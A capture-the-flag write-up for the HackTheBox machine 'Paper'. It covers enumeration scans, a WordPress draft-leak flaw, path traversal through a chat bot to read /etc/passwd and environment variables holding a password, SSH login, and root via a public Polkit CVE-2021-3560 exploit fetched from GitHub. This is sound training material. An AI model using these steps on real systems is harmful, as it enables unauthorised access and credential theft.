# HACKTHEBOX - Paper

## Description
Release Area(private machine)
```bash
export IP=10.129.155.83
```
## Enumeration
```bash
sudo nmap -v -sV -sC -oN nmap.txt $IP
```
**nmap result**:
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: .....
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
```

```bash
gobuster dir -u http://10.129.155.83/ -w /usr/share/wordlists/dirb/common.txt
# /cgi-bin/
# /manual
```
```bash
nikto -host http://10.129.155.83/ # from now on, let's make nikto scan in every webserver when doing enumeration.
```
**nikto results**:
```
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
```

## Foothold
`x-backend-server: office.paper`

**Backend Server??**: https://bizflycloud.vn/tin-tuc/tong-quan-ve-front-end-server-va-back-end-server-la-gi-20181029105229742.htm

Ok, let's add backend server `office.paper` domain name to  `/etc/hosts` file.
```
10.129.155.83 office.paper
```

**Access**: http://office.paper/

Blog app powered by `wordpress`
```
# Author: prisonmike
Feeling Alone!
I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me.

So, other employees who were added to this blog are now removed.

As of now there is only one user in this blog. Which is me! Just me.

# Comment section
June 20, 2021 at 2:49 pm
Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick
```

Wappalyzer: `WordPress 5.2.3`
```bash
searchsploit WordPress 5.2.3
# WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md
```

**multiple/webapps/47690.md**:
```
So far we know that adding `?static=1` to a wordpress URL should leak its secret content
Here are a few ways to manipulate the returned entries:
..... sql injection
In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content.
```

**Access**: http://office.paper/?static=1

Secret content:
```
Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
# Secret Registration URL of new Employee chat system
http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
# Also, stop looking at my drafts. Jeez
```
Ok, add `chat.office.paper` to `/etc/hosts`

**Access**: http://chat.office.paper/register/8qozr226AhkCHZdyY

Register --> meet bot chat can list and read file

`/etc/passwd`:
```
root❌0:0:root:/root:/bin/bash

rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
```

`../../../proc/self/environ`:
```
RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat
```

**credential found**: `USER=dwight` : `ROCKETCHAT_PASSWORD=Queenofblad3s!23`

## RCE
```bash
ssh dwight@$IP
# Password: Queenofblad3s!23
```
Yes, thank god, f!#$ me!!

**user flag**: `cde7cc2e041eed042fadd30ade7XXXXX`

## Privileged Escalation
using `linpeas` to enumeration but nothing, #$%#

But my friend, remember to stay up to date

**Linpeas**: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

*Newest version*: `2.6.8` while the script you using is `2.2.4`
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh # | sh # get newest version

# Download linpeas.sh to remote machine 

./linpeas.sh
# [Vulnerable to CVE-2021-3560]
```

Found the exploit for `CVE-2021-3506`:
```bash
git clone https://github.com/Almorabea/Polkit-exploit

# transfer to remote machine and
python3 CVE-2021-3560.py
# wait
# .
# .
id # root
```

**root flag**: `XXXXXXXXXXXXXXXXXXXXXXX`
